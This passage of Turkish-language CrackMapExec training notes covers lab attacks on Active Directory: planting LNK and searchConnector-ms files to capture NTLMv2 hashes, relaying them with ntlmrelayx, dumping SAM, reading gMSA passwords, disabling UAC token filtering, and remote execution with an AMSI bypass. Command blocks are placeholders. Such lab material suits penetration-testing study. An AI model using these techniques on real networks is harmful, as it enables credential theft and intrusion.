`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

